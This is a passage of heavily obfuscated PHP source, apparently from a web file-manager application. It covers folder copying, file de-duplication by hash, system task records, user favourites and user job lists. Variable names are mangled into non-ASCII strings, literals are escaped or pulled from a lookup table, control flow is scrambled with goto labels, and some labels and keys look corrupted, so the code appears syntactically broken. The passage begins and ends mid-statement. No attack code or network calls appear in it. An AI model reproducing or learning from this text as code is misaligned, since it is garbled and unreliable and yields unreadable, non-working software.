$C‘ö­µèîÜ[$Dİê¶°¸§[484]] && $b¢“‰µ¥Œƒ[$Dİê¶°¸§[404]] == $Dİê¶°¸§[562]) { return; } $e¡‘ò´âŠ = array($Dİê¶°¸§[487] => array($Dİê¶°¸§[512], $b¢“‰µ¥Œƒ[$Dİê¶°¸§[487]] . $cìÒ…Û²ŞÙ . $Dİê¶°¸§[513])); $bÁ‹ëÑªíÍ = $this->field($Dİê¶°¸§[410])->where($e¡‘ò´âŠ)->getField($Dİê¶°¸§[395], !0); goto C×¥Äñë°æ; FÖ†¯ƒÜÕã: if (!$B–öß™µË­) { return; } $B–öß™µË­ = array_to_keyvalue($B–öß™µË­, $Dİê¶°¸§[33], $Dİê¶°¸§[468]); $e¡‘ò´âŠ = array($Dİê¶°¸§[468] => array($Dİê¶°¸§[7], $B–öß™µË­)); goto FÁï²¾‘É¶; DÚ¥ŸÍ¨­: } public function copyFolderFromIO($BùÁğ…Ì÷–, $c°·±¢ˆ¬İ, $a¢‡¤ï¯Ñù, $F½Õ¦ßˆ•, $Fõíçµä¦Ò, $fã½§÷‚Èô = false) { goto cİÀ‘Š°Ù‰; fÂÎ¤„ƒå: Hook::trigger($dªÇ¸éçœô[567]); if ($DØ§†ãÜ¤œ) { $this->folderSizeResetChildren($DØ§†ãÜ¤œ); } $this->_childrenListClear(); goto FÑ§µ¸ùçš; CòåèÓ: $b‚ÃìÀ¬½ = $this->fileNameExist($a¢‡¤ï¯Ñù, $eÈØ¤…ÜïÅ); $DØ§†ãÜ¤œ = $this->mkdir($a¢‡¤ï¯Ñù, $eÈØ¤…ÜïÅ, $F½Õ¦ßˆ•); if (!$b‚ÃìÀ¬½ || $F½Õ¦ßˆ• == REPEAT_RENAME_FOLDER) { $F½Õ¦ßˆ• = !1; } goto DÀÖğ ‡; DÀÖğ ‡: if ($b‚ÃìÀ¬½) { $this->_childrenAllMake($b‚ÃìÀ¬½); } Hook::trigger($dªÇ¸éçœô[566]); $this->_copyChildTo($BùÁğ…Ì÷–, $c°·±¢ˆ¬İ, $DØ§†ãÜ¤œ, $F½Õ¦ßˆ•, $BˆÔ¤ò÷ç, $Fõíçµä¦Ò); goto fÂÎ¤„ƒå; EÉÌ÷Ë†: $this->updateModifyTime($a¢‡¤ï¯Ñù); return $DØ§†ãÜ¤œ; goto FĞ¤ïÜÇ•; D±‰×Æèø¬: Model($dªÇ¸éçœô[450])->linkAdd($BˆÔ¤ò÷ç[$dªÇ¸éçœô[529]]); Model($dªÇ¸éçœô[450])->remove($BˆÔ¤ò÷ç[$dªÇ¸éçœô[565]]); $this->folderSizeReset($a¢‡¤ï¯Ñù); goto EÉÌ÷Ë†; FÑ§µ¸ùçš: Model($dªÇ¸éçœô[532])->addAll($BˆÔ¤ò÷ç[$dªÇ¸éçœô[530]], array(), !0); Model($dªÇ¸éçœô[533])->eventCopy($DØ§†ãÜ¤œ); $this->saveAll($BˆÔ¤ò÷ç[$dªÇ¸éçœô[531]]); goto D±‰×Æèø¬; cİÀ‘Š°Ù‰: $dªÇ¸éçœô =& $_SERVER[œº]; $BˆÔ¤ò÷ç = array($dªÇ¸éçœô[530] => array(), $dªÇ¸éçœô[531] => array(), $dªÇ¸éçœô[529] => array(), $dªÇ¸éçœô[565] => array()); $eÈØ¤…ÜïÅ = $fã½§÷‚Èô ? $fã½§÷‚Èô : $BùÁğ…Ì÷–->pathThis($c°·±¢ˆ¬İ); goto CòåèÓ; FĞ¤ïÜÇ•: } private function _copyChildTo($EğäŸŒ®Ñœ, $Eã‘á­Š‡Š, $bÒÛÎ¯Ç•Ÿ, $BöÎ„°Ô«Ì, &$C›¸¸£´Û, $f¯¯÷Ğñ…Å) { goto A£¾ …Ú×¶; dÇİñ™™¶ã: $dÜë·ªØ­ = $dÜë·ªØ­ ? $dÜë·ªØ­ : array($dÚ óó¯[74] => array(), $dÚ óó¯[75] => array()); $c„áÅ ¼ = array_merge($dÜë·ªØ­[$dÚ óó¯[74]], $dÜë·ªØ­[$dÚ óó¯[75]]); $CÑù¿Ÿ¬šä = $this->_addFiles($EğäŸŒ®Ñœ, $dÜë·ªØ­[$dÚ óó¯[74]], $f¯¯÷Ğñ…Å); goto Cš®À¿‹ø¦; C•ƒù¯ª±Ÿ: if (!empty($eë½ÆôºÆ)) { $this->addAll($eë½ÆôºÆ); $this->_childrenListSelect($bÒÛÎ¯Ç•Ÿ); } $f­Üß“¢ÔÉ = $this->_childrenList($bÒÛÎ¯Ç•Ÿ); $f­Üß“¢ÔÉ = array_to_keyvalue($f­Üß“¢ÔÉ, $dÚ óó¯[28]); goto a­è¥ãÈäÅ; a­è¥ãÈäÅ: foreach ($c„áÅ ¼ as $e‰Åêá÷Ü) { $f›Ë±†™œ = $f­Üß“¢ÔÉ[$e‰Åêá÷Ü[$dÚ óó¯[28]]]; $fø†¼ç©÷÷ = $f›Ë±†™œ[$dÚ óó¯[395]]; $this->_copyApplyMeta($f›Ë±†™œ, $C›¸¸£´Û); if ($e‰Åêá÷Ü[$dÚ óó¯[29]] == $dÚ óó¯[77]) { $e‰Åêá÷Ü[$dÚ óó¯[76]] = $EğäŸŒ®Ñœ->getPathInner($e‰Åêá÷Ü[$dÚ óó¯[76]]); $this->_copyChildTo($EğäŸŒ®Ñœ, $e‰Åêá÷Ü[$dÚ óó¯[76]], $fø†¼ç©÷÷, $BöÎ„°Ô«Ì, $C›¸¸£´Û, $f¯¯÷Ğñ…Å); } } goto B¾çÙ¾–Õ; Cš®À¿‹ø¦: $eë½ÆôºÆ = array(); foreach ($c„áÅ ¼ as &$e‰Åêá÷Ü) { goto dåïÀœø„; A¶¹ªƒ¨œ˜: if ($BöÎ„°Ô«Ì) { $f»—İÚåÂ = $this->fileNameExistCache($bÒÛÎ¯Ç•Ÿ, $e‰Åêá÷Ü[$dÚ óó¯[28]]); if ($f»—İÚåÂ) { if ($e‰Åêá÷Ü[$dÚ óó¯[403]] || $BöÎ„°Ô«Ì == REPEAT_SKIP) { continue; } if ($BöÎ„°Ô«Ì == REPEAT_REPLACE) { $f›Ë±†™œ = $this->sourceInfoCache($f»—İÚåÂ); $CéÊë‡ôí = $this->fileHistory($f›Ë±†™œ, $e‰Åêá÷Ü[$dÚ óó¯[447]], $e‰Åêá÷Ü[$dÚ óó¯[78]]); if ($CéÊë‡ôí) { $C›¸¸£´Û[$dÚ óó¯[529]][] = $e‰Åêá÷Ü[$dÚ óó¯[447]]; } continue; } else { if ($BöÎ„°Ô«Ì == REPEAT_RENAME) { $e‰Åêá÷Ü[$dÚ óó¯[28]] = $this->fileNameAutoCache($bÒÛÎ¯Ç•Ÿ, $e‰Åêá÷Ü[$dÚ óó¯[28]], $BöÎ„°Ô«Ì, !1); } } } } if (!$e‰Åêá÷Ü[$dÚ óó¯[403]] && $e‰Åêá÷Ü[$dÚ óó¯[447]]) { $C›¸¸£´Û[$dÚ óó¯[529]][] = $e‰Åêá÷Ü[$dÚ óó¯[447]]; } $eë½ÆôºÆ[] = $this->_makeItemData($e‰Åêá÷Ü, $AÙãÇ½ƒÙŠ, $e‰Åêá÷Ü[$dÚ óó¯[28]]); goto d®­»©Ã®†; D„ãôŒ¥¾: $e‰Åêá÷Ü[$dÚ óó¯[78]] = _get($e‰Åêá÷Ü, $dÚ óó¯[78], 0); $e‰Åêá÷Ü[$dÚ óó¯[447]] = _get($e‰Åêá÷Ü, $dÚ óó¯[447], 0); if (!isset($e‰Åêá÷Ü[$dÚ óó¯[568]]) && $e‰Åêá÷Ü[$dÚ óó¯[447]]) { $C›¸¸£´Û[$dÚ óó¯[565]][] = $e‰Åêá÷Ü[$dÚ óó¯[447]]; } goto A¶¹ªƒ¨œ˜; dåïÀœø„: if (isset($CÑù¿Ÿ¬šä[$e‰Åêá÷Ü[$dÚ óó¯[28]]])) { $e‰Åêá÷Ü = $CÑù¿Ÿ¬šä[$e‰Åêá÷Ü[$dÚ óó¯[28]]]; } $e‰Åêá÷Ü[$dÚ óó¯[403]] = $e‰Åêá÷Ü[$dÚ óó¯[29]] == $dÚ óó¯[77]; $e‰Åêá÷Ü[$dÚ óó¯[405]] = _get($e‰Åêá÷Ü, $dÚ óó¯[168], $dÚ óó¯[33]); goto D„ãôŒ¥¾; d®­»©Ã®†: } unset($e‰Åêá÷Ü); goto C•ƒù¯ª±Ÿ; A£¾ …Ú×¶: $dÚ óó¯ =& $_SERVER[œº]; $AÙãÇ½ƒÙŠ = $this->sourceInfoCache($bÒÛÎ¯Ç•Ÿ); $dÜë·ªØ­ = $EğäŸŒ®Ñœ->listPath($Eã‘á­Š‡Š); goto dÇİñ™™¶ã; B¾çÙ¾–Õ: } private function _addFiles($EöÓ¯å‰í, $aŒÊŸÉ‡÷, $d‹©ÍÆÆèì) { goto BÈ¸‰Æ‰Ü; f‰å«àó‹è: foreach ($aŒÊŸÉ‡÷ as $C–´İÔƒŒ¢) { $E”±äÜñ”›[$C–´İÔƒŒ¢[$aîæÀ‰¥ğ[28]]] = $C–´İÔƒŒ¢; } return $E”±äÜñ”›; goto d°ÉÆæŞîÂ; eÜÊ‰ˆ’‡: $C¿´åÃëò†->addAll($F‚ØÛ¶‘÷Ä); $bĞôÑÅğí™ = array($aîæÀ‰¥ğ[170] => array($aîæÀ‰¥ğ[7], array_keys($D¿‡‹ƒƒ¥°))); $cêœ²¾Œ¶à = $C¿´åÃëò†->where($bĞôÑÅğí™)->select(); goto d‡Êõ‘´ã ; C­°İá£øİ: foreach ($cêœ²¾Œ¶à as $bÇ›¾ô¬Ë) { if (!isset($D¿‡‹ƒƒ¥°[$bÇ›¾ô¬Ë[$aîæÀ‰¥ğ[170]]])) { continue; } $Aš«³±²ˆ½ = $D¿‡‹ƒƒ¥°[$bÇ›¾ô¬Ë[$aîæÀ‰¥ğ[170]]]; foreach ($Aš«³±²ˆ½ as &$B¢½£÷¨´¨) { $B¢½£÷¨´¨[$aîæÀ‰¥ğ[447]] = $bÇ›¾ô¬Ë[$aîæÀ‰¥ğ[447]]; $B¢½£÷¨´¨[$aîæÀ‰¥ğ[568]] = !0; } unset($B¢½£÷¨´¨); } $F‚ØÛ¶‘÷Ä = array(); foreach ($aŒÊŸÉ‡÷ as $e…ÑÉ¯ÄÊ—) { if (isset($e…ÑÉ¯ÄÊ—[$aîæÀ‰¥ğ[568]]) && $e…ÑÉ¯ÄÊ—[$aîæÀ‰¥ğ[568]]) { continue; } $d±È¦Å = $EöÓ¯å‰í->getPathInner($e…ÑÉ¯ÄÊ—[$aîæÀ‰¥ğ[76]]); $BÏŠ«Áºãà = $C¿´åÃëò†->addFileMake($d±È¦Å, $e…ÑÉ¯ÄÊ—[$aîæÀ‰¥ğ[78]], $e…ÑÉ¯ÄÊ—[$aîæÀ‰¥ğ[171]], $e…ÑÉ¯ÄÊ—[$aîæÀ‰¥ğ[170]], $e…ÑÉ¯ÄÊ—[$aîæÀ‰¥ğ[28]], $d‹©ÍÆÆèì); $F‚ØÛ¶‘÷Ä[] = $BÏŠ«Áºãà; } goto eÜÊ‰ˆ’‡; c‘’½ğ›˜×: $C¿´åÃëò† = Model($aîæÀ‰¥ğ[571]); $cêœ²¾Œ¶à = $C¿´åÃëò†->where($bĞôÑÅğí™)->select(); $cêœ²¾Œ¶à = $cêœ²¾Œ¶à ? $cêœ²¾Œ¶à : array(); goto C­°İá£øİ; d‡Êõ‘´ã : $cêœ²¾Œ¶à = $cêœ²¾Œ¶à ? $cêœ²¾Œ¶à : array(); foreach ($cêœ²¾Œ¶à as $bÇ›¾ô¬Ë) { if (!isset($D¿‡‹ƒƒ¥°[$bÇ›¾ô¬Ë[$aîæÀ‰¥ğ[170]]])) { continue; } $a«×æ´‹ï =& $D¿‡‹ƒƒ¥°[$bÇ›¾ô¬Ë[$aîæÀ‰¥ğ[170]]]; foreach ($a«×æ´‹ï as &$B¢½£÷¨´¨) { $B¢½£÷¨´¨[$aîæÀ‰¥ğ[447]] = $bÇ›¾ô¬Ë[$aîæÀ‰¥ğ[447]]; } unset($B¢½£÷¨´¨); } $E”±äÜñ”› = array(); goto f‰å«àó‹è; BÈ¸‰Æ‰Ü: $aîæÀ‰¥ğ =& $_SERVER[œº]; if (!$aŒÊŸÉ‡÷ || count($aŒÊŸÉ‡÷) == 0) { return array(); } $D¿‡‹ƒƒ¥° = array(); goto AŠÙ»Îë©‹; AŠÙ»Îë©‹: foreach ($aŒÊŸÉ‡÷ as &$B¢½£÷¨´¨) { goto Bİ¥…‘¡Ğ—; eÊ„à¿Ò’µ: $CŒæóô‚Ô³ = $EöÓ¯å‰í->hashMd5($B¢½£÷¨´¨[$aîæÀ‰¥ğ[76]]); if (strlen($CŒæóô‚Ô³) > 10 && !isset($D¿‡‹ƒƒ¥°[$CŒæóô‚Ô³])) { $D¿‡‹ƒƒ¥°[$CŒæóô‚Ô³] = array(); } $B¢½£÷¨´¨[$aîæÀ‰¥ğ[171]] = $bÈÛÕİÆ‚®; goto CŞè—™‚; Bİ¥…‘¡Ğ—: Hook::trigger($aîæÀ‰¥ğ[569], $B¢½£÷¨´¨); $B¢½£÷¨´¨[$aîæÀ‰¥ğ[76]] = $EöÓ¯å‰í->getPathInner($B¢½£÷¨´¨[$aîæÀ‰¥ğ[76]]); $bÈÛÕİÆ‚® = $EöÓ¯å‰í->hashSimple($B¢½£÷¨´¨[$aîæÀ‰¥ğ[76]]); goto eÊ„à¿Ò’µ; CŞè—™‚: $B¢½£÷¨´¨[$aîæÀ‰¥ğ[170]] = $CŒæóô‚Ô³; Hook::trigger($aîæÀ‰¥ğ[570], $B¢½£÷¨´¨); $D¿‡‹ƒƒ¥°[$CŒæóô‚Ô³][] =& $B¢½£÷¨´¨; goto C›âñŒÀ‚¹; C›âñŒÀ‚¹: if (count($D¿‡‹ƒƒ¥°[$CŒæóô‚Ô³]) > 1) { $B¢½£÷¨´¨[$aîæÀ‰¥ğ[568]] = !0; } goto D‹â¿î¤ˆ°; D‹â¿î¤ˆ°: } unset($B¢½£÷¨´¨); $bĞôÑÅğí™ = array($aîæÀ‰¥ğ[170] => array($aîæÀ‰¥ğ[7], array_keys($D¿‡‹ƒƒ¥°))); goto c‘’½ğ›˜×; d°ÉÆæŞîÂ: } } define($_SERVER[œº][572], $_SERVER[œº][573]); goto b„ğ‹Ê¬Ÿ¯; A…ˆÜÁÒ˜: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x74\141\x73\x6b\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\164\x79\160\145", "\x65\x76\x65\156\x74", "\x74\x69\x6d\145", "\x64\145\x73\143", "\x73\171\x73\164\x65\155", "\145\x6e\141\142\154\x65", "\154\x61\x73\164\122\x75\156", "\163\x6f\162\x74"); public function listData($b¡Ø°¶àè¥ = false, $C„—åÒØƒ = "\x73\x6f\x72\164", $eàˆßèÒ×‡ = false) { return parent::listData($b¡Ø°¶àè¥, $C„—åÒØƒ, $eàˆßèÒ×‡); } public function add($C°¡ÑÌ×…) { $D·À¸Î¥¨Ä =& $_SERVER[œº]; $aˆÙ£˜Â°î = $this->findByName($C°¡ÑÌ×…[$D·À¸Î¥¨Ä[28]]); if ($aˆÙ£˜Â°î) { return !1; } $C°¡ÑÌ×…[$D·À¸Î¥¨Ä[1493]] = 0; $C°¡ÑÌ×…[$D·À¸Î¥¨Ä[1715]] = $this->getSort(); return parent::insert($C°¡ÑÌ×…); } private function getSort() { $b´ĞŸùï¥° =& $_SERVER[œº]; $DÛÇÊ‚óÕŞ = parent::listData(); $A±ô·“¤ˆ = array_to_keyvalue($DÛÇÊ‚óÕŞ, $b´ĞŸùï¥°[33], $b´ĞŸùï¥°[1715]); return empty($A±ô·“¤ˆ) ? 0 : max($A±ô·“¤ˆ) + 1; } public function update($F¡šÛÀì, $f¦î´‘İéÓ) { $CÃÈÃíŞğŞ =& $_SERVER[œº]; $b°¸ßù›¸ = $this->listData($F¡šÛÀì); $dÄ–÷¯Š› = $this->findByName($f¦î´‘İéÓ[$CÃÈÃíŞğŞ[28]]); if (!$b°¸ßù›¸ || $dÄ–÷¯Š› && $dÄ–÷¯Š›[$CÃÈÃíŞğŞ[393]] != $b°¸ßù›¸[$CÃÈÃíŞğŞ[393]]) { return !1; } return parent::update($F¡šÛÀì, $f¦î´‘İéÓ); } public function remove($B˜ÀŞ‡¼ , $c—¯áì¢óÂ = false) { $FÜèè‡˜±ó =& $_SERVER[œº]; $BŠ—Ü¸ŸÙ = $this->listData($B˜ÀŞ‡¼ ); if (!$BŠ—Ü¸ŸÙ) { return; } if (!$c—¯áì¢óÂ && $BŠ—Ü¸ŸÙ[$FÜèè‡˜±ó[1171]] == $FÜèè‡˜±ó[87]) { return !1; } return parent::remove($B˜ÀŞ‡¼ ); } public function enable($aµ°‘±§Áß, $F¹”äÌ”ìÓ) { return $this->update($aµ°‘±§Áß, array($_SERVER[œº][2102] => $F¹”äÌ”ìÓ)); } public function run($EîÁ¿«Šâ¬) { return $this->update($EîÁ¿«Šâ¬, array($_SERVER[œº][2112] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($CÓ”‡ğ›õ) { $Bóé‹ŠŒ›¶ =& $_SERVER[œº]; return array($Bóé‹ŠŒ›¶[1794] => array(USER_ID, $Bóé‹ŠŒ›¶[2113])); } protected function listData() { $BæáíÎÀ =& $_SERVER[œº]; $f‹«š¯ŒÎ¹ = array($BæáíÎÀ[1520] => USER_ID, $BæáíÎÀ[463] => 0); $DÉó±ˆ¿œ = $BæáíÎÀ[2114]; $e°Âé“»¹ = $this->field($DÉó±ˆ¿œ)->where($f‹«š¯ŒÎ¹)->order($BæáíÎÀ[2115])->select(); return $e°Âé“»¹ ? $e°Âé“»¹ : array(); } protected function resetCache() { } protected function listView() { goto A·²ÈÀ·Âî; FÅÃ‰Àœ¯É: $A°â‚°‹„„ = array_to_keyvalue($dòéïÉ³Á, $C¼‹ëŸëĞ‹[33], $C¼‹ëŸëĞ‹[76]); if (!$A°â‚°‹„„) { return $BÂ¥Å‹›ÙÓ; } $FŸ°ñ¢ÕÙæ = 2000; goto B”Öœ—œóµ; B”Öœ—œóµ: $dË±âÅ‘‘Ô = array($C¼‹ëŸëĞ‹[410] => array($C¼‹ëŸëĞ‹[411], $A°â‚°‹„„)); $D¨±ø‰Ú = Model($C¼‹ëŸëĞ‹[790])->listSource($dË±âÅ‘‘Ô, $FŸ°ñ¢ÕÙæ); $D¨±ø‰Ú = array_merge($D¨±ø‰Ú[$C¼‹ëŸëĞ‹[74]], $D¨±ø‰Ú[$C¼‹ëŸëĞ‹[75]]); goto fğ™Úê›ìä; A·²ÈÀ·Âî: $C¼‹ëŸëĞ‹ =& $_SERVER[œº]; $BÂ¥Å‹›ÙÓ = $this->listData(); $dòéïÉ³Á = array_filter_by_field($BÂ¥Å‹›ÙÓ, $C¼‹ëŸëĞ‹[29], $C¼‹ëŸëĞ‹[409]); goto FÅÃ‰Àœ¯É; fğ™Úê›ìä: $D¨±ø‰Ú = array_to_keyvalue($D¨±ø‰Ú, $C¼‹ëŸëĞ‹[395]); foreach ($BÂ¥Å‹›ÙÓ as $B¨¯Æ•À« => $Dƒß„Ó²Š¡) { $f‘Â‰Õ²¢õ = $D¨±ø‰Ú[$Dƒß„Ó²Š¡[$C¼‹ëŸëĞ‹[76]]]; $f‘Â‰Õ²¢õ = $f‘Â‰Õ²¢õ ? $f‘Â‰Õ²¢õ : array(); $BÂ¥Å‹›ÙÓ[$B¨¯Æ•À«] = array_merge($f‘Â‰Õ²¢õ, $Dƒß„Ó²Š¡); } return $BÂ¥Å‹›ÙÓ; goto cæ »Û¨Û; cæ »Û¨Û: } protected function addFav($BŞô™ê¤Œõ, $b¹‰ë¡‹—ƒ = '', $f’°ÍÔÅ = "\163\157\x75\162\x63\x65") { goto f†ÌŒ“Áˆ; f†ÌŒ“Áˆ: $Bë“Œõ»¸Š =& $_SERVER[œº]; $D¼²…’ğ’ = array($Bë“Œõ»¸Š[1520] => USER_ID, $Bë“Œõ»¸Š[463] => 0, $Bë“Œõ»¸Š[415] => $f’°ÍÔÅ, $Bë“Œõ»¸Š[414] => $BŞô™ê¤Œõ); if ($this->where($D¼²…’ğ’)->find()) { return !1; } goto c³É»Œ; c³É»Œ: $D¼²…’ğ’ = array($Bë“Œõ»¸Š[1520] => USER_ID, $Bë“Œõ»¸Š[463] => 0); $cÇÙÉÍ£­ = $this->where($D¼²…’ğ’)->max($Bë“Œõ»¸Š[1715]); if (!$cÇÙÉÍ£­) { $cÇÙÉÍ£­ = 0; } goto e™åâ°¢ßö; câëÉÙÖ¯¯: return $this->add($e´ òÆ³); goto DºŞ‰âø½ä; e™åâ°¢ßö: if (!$b¹‰ë¡‹—ƒ && $f’°ÍÔÅ == $Bë“Œõ»¸Š[409]) { $fœÆ¥½„ = Model($Bë“Œõ»¸Š[1206])->where(array($Bë“Œõ»¸Š[410] => $BŞô™ê¤Œõ))->find(); if (!$fœÆ¥½„) { return !1; } $b¹‰ë¡‹—ƒ = $fœÆ¥½„[$Bë“Œõ»¸Š[28]]; } $b¹‰ë¡‹—ƒ = $this->getAutoName($b¹‰ë¡‹—ƒ); $e´ òÆ³ = array($Bë“Œõ»¸Š[1520] => USER_ID, $Bë“Œõ»¸Š[463] => 0, $Bë“Œõ»¸Š[413] => $b¹‰ë¡‹—ƒ, $Bë“Œõ»¸Š[414] => $BŞô™ê¤Œõ, $Bë“Œõ»¸Š[415] => $f’°ÍÔÅ, $Bë“Œõ»¸Š[1696] => $cÇÙÉÍ£­ + 1); goto câëÉÙÖ¯¯; DºŞ‰âø½ä: } protected function remove($DÒ‹ÃœÏø) { $f…„óë³šß =& $_SERVER[œº]; $aø¬ñ¬¬„ù = array($f…„óë³šß[1520] => USER_ID, $f…„óë³šß[412] => $DÒ‹ÃœÏø); return $this->where($aø¬ñ¬¬„ù)->delete(); } protected function removeByName($bÔÊ‘…õÉ) { $A±“Ê‰İßĞ =& $_SERVER[œº]; $AŠ˜‚òÏ‹¥ = array($A±“Ê‰İßĞ[1520] => USER_ID, $A±“Ê‰İßĞ[413] => $bÔÊ‘…õÉ, $A±“Ê‰İßĞ[463] => 0); return $this->where($AŠ˜‚òÏ‹¥)->delete(); } protected function rename($bŠ·ÃŒÊø, $eµù¿µŠ¸Š) { $DÔšòº¦ßƒ =& $_SERVER[œº]; if ($bŠ·ÃŒÊø == $eµù¿µŠ¸Š) { return !1; } $BÓø«à» = $this->getAutoName($eµù¿µŠ¸Š); if ($eµù¿µŠ¸Š != $BÓø«à») { return !1; } $C­‡è™øùÄ = array($DÔšòº¦ßƒ[1520] => USER_ID, $DÔšòº¦ßƒ[463] => 0, $DÔšòº¦ßƒ[28] => $bŠ·ÃŒÊø); return $this->where($C­‡è™øùÄ)->save(array($DÔšòº¦ßƒ[28] => $eµù¿µŠ¸Š)); } protected function resetSort($f¨éªŠ²ˆ) { $fíøòÀ‡Ïé =& $_SERVER[œº]; $f¨éªŠ²ˆ = is_array($f¨éªŠ²ˆ) ? $f¨éªŠ²ˆ : array(); $BÙ©¹âÛ¦° = array($fíøòÀ‡Ïé[1520] => USER_ID); for ($DåÜ¸‡ö“Ä = 0; $DåÜ¸‡ö“Ä < count($f¨éªŠ²ˆ); $DåÜ¸‡ö“Ä++) { $BÙ©¹âÛ¦°[$fíøòÀ‡Ïé[412]] = $f¨éªŠ²ˆ[$DåÜ¸‡ö“Ä]; $this->where($BÙ©¹âÛ¦°)->save(array($fíøòÀ‡Ïé[1696] => $DåÜ¸‡ö“Ä + 1)); } return !0; } protected function moveTop($bŞ°¤ÀÌË) { goto EóÓ…»»î›; dÔ„ŒİŞö: if (!$cãØŠæğ) { return; } $C±ÈóÖÆØ¸ = $this->field($eíìæ„‘œ[393])->where($AÖ‹£ĞÍšÏ)->order($eíìæ„‘œ[2115])->select(); $C±ÈóÖÆØ¸ = array_to_keyvalue($C±ÈóÖÆØ¸, $eíìæ„‘œ[33], $eíìæ„‘œ[393]); goto e´†Ğ¿Ñ¨©; e´†Ğ¿Ñ¨©: $FËÄèñˆèğ = $C±ÈóÖÆØ¸; $C±ÈóÖÆØ¸ = array_remove_value($C±ÈóÖÆØ¸, $cãØŠæğ[$eíìæ„‘œ[393]]); array_unshift($C±ÈóÖÆØ¸, $cãØŠæğ[$eíìæ„‘œ[393]]); goto C¬ñŠ“; EóÓ…»»î›: $eíìæ„‘œ =& $_SERVER[œº]; $AÖ‹£ĞÍšÏ = array($eíìæ„‘œ[1520] => USER_ID, $eíìæ„‘œ[463] => 0); $cãØŠæğ = $this->where($AÖ‹£ĞÍšÏ)->where(array($eíìæ„‘œ[28] => $bŞ°¤ÀÌË))->find(); goto dÔ„ŒİŞö; C¬ñŠ“: return $this->resetSort($C±ÈóÖÆØ¸); goto C™õÈ‚²«Ğ; C™õÈ‚²«Ğ: } protected function moveBottom($e‹ˆµŞµ®ç) { $B‚œ¡‰âÒ =& $_SERVER[œº]; $A·ÕªÎå‹œ = array($B‚œ¡‰âÒ[1520] => USER_ID, $B‚œ¡‰âÒ[463] => 0); $dß”¬«¸ô = $this->where($A·ÕªÎå‹œ)->max($B‚œ¡‰âÒ[1715]); $c÷ùÎÌªô° = array($B‚œ¡‰âÒ[1715] => $dß”¬«¸ô + 1); return $this->where($A·ÕªÎå‹œ)->where(array($B‚œ¡‰âÒ[28] => $e‹ˆµŞµ®ç))->save($c÷ùÎÌªô°); } private function getAutoName($f¯ˆ¸ÕÄ) { goto D¢ßğµ ç‹; EÆ¬ì“Û„†: return $f¯ˆ¸ÕÄ . "\x28{$cİÇÚ¾²Ë}\51"; goto F½‚ë …; EìŸ¼—ğ»Œ: $cÑ¯ÛÉÆí£ = array_to_keyvalue($cÑ¯ÛÉÆí£, $eŠÂ·Á•†ò[33], $eŠÂ·Á•†ò[28]); if (!$cÑ¯ÛÉÆí£ || !in_array($f¯ˆ¸ÕÄ, $cÑ¯ÛÉÆí£)) { return $f¯ˆ¸ÕÄ; } for ($cİÇÚ¾²Ë = 0; $cİÇÚ¾²Ë < count($cÑ¯ÛÉÆí£); $cİÇÚ¾²Ë++) { if (!in_array($f¯ˆ¸ÕÄ . "\50{$cİÇÚ¾²Ë}\51", $cÑ¯ÛÉÆí£)) { return $f¯ˆ¸ÕÄ . "\x28{$cİÇÚ¾²Ë}\51"; } } goto EÆ¬ì“Û„†; D¢ßğµ ç‹: $eŠÂ·Á•†ò =& $_SERVER[œº]; $a¤±«ùÂ¯ğ = array($eŠÂ·Á•†ò[1520] => USER_ID, $eŠÂ·Á•†ò[463] => 0); $cÑ¯ÛÉÆí£ = $this->field($eŠÂ·Á•†ò[28])->where($a¤±«ùÂ¯ğ)->select(); goto EìŸ¼—ğ»Œ; F½‚ë …: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\152\x6f\142\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x64\x65\163\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\145\x6c\x66\x4a\x6f\x62\114\151\x73\164"; public function listData($A­²¼Ñ‘îô = false, $cŠ¾‡ÊÑî§ = "\x73\157\162\x74", $FÏ£Ö®˜êÆ = false) { return parent::listData($A­²¼Ñ‘îô, $cŠ¾‡ÊÑî§, $FÏ£Ö®˜êÆ); } public function remove($Aš†¹£²á‘) { return parent::remove($Aš†¹£²á‘); } public function add($BãÅÊˆ—ßğ) { $DĞà…‘Šîà =& $_SERVER[œº]; if ($this->findByName($BãÅÊˆ—ßğ[$DĞà…‘Šîà[28]])) { return !1; } $BãÅÊˆ—ßğ[$DĞà…‘Šîà[1715]] = $this->getSort(); return parent::insert($BãÅÊˆ—ßğ); } private function getSort() { $B’²é„±Î¦ =& $_SERVER[œº]; $C«ËµÂÍ¯ä = parent::listData(); $dîîéé¡ï» = array_to_keyvalue($C«ËµÂÍ¯ä, $B’²é„±Î¦[33], $B’²é„±Î¦[1715]); return empty($dîîéé¡ï») ? 0 : max($dîîéé¡ï») + 1; } public function update($Cİ„åì·ç, $fôà±ØŞà) { $aòáÒ¨ =& $_SERVER[œº]; $dê¶÷Ê‘ºÉ = parent::listData($Cİ„åì·ç); $FğÏÛá’–£ = $this->findByName($fôà±ØŞà[$aòáÒ¨[28]]); if (!$dê¶÷Ê‘ºÉ || $FğÏÛá’–£ && $FğÏÛá’–£[$aòáÒ¨[393]] != $dê¶÷Ê‘ºÉ[$aòáÒ¨[393]]) { return !1; } return parent::update($Cİ„åì·ç, $fôà±ØŞà); } public function setUserJob($E­àå±†œò, $E±¬é¤á¨«) { goto c§í¤óØóà; c§í¤óØóà: $d­½†ëÀ‡Ü =& $_SERVER[œº]; if (!is_array($E±¬é¤á¨«)) { $E±¬é¤á¨« = array($E±¬é¤á¨«); } $F¹¾ªãÖ©Ê = parent::listData(); goto dïê©å„Ç; fŒëÙ˜ê„: $b¾îæ¯…¢‡ = rtrim($b¾îæ¯…¢‡, $d­½†ëÀ‡Ü[47]); Model($d­½†ëÀ‡Ü[506])->metaSet($E­àå±†œò, self::JOB_KEY, $b¾îæ¯…¢‡); goto cÄ’ÒÊóçÍ; dïê©å„Ç: $bÂÖãàº¿ƒ = array_to_keyvalue($F¹¾ªãÖ©Ê, $d­½†ëÀ‡Ü[28]); $b¾îæ¯…¢‡ = $d­½†ëÀ‡Ü[375]; foreach ($E±¬é¤á¨« as $BÊÅ»ÃÖ«Ë) { if ($bÂÖãàº¿ƒ[$BÊÅ»ÃÖ«Ë]) { $b¾îæ¯…¢‡ .= $bÂÖãàº¿ƒ[$BÊÅ»ÃÖ«Ë][$d­½†ëÀ‡Ü[393]] . $d­½†ëÀ‡Ü[47]; } else { 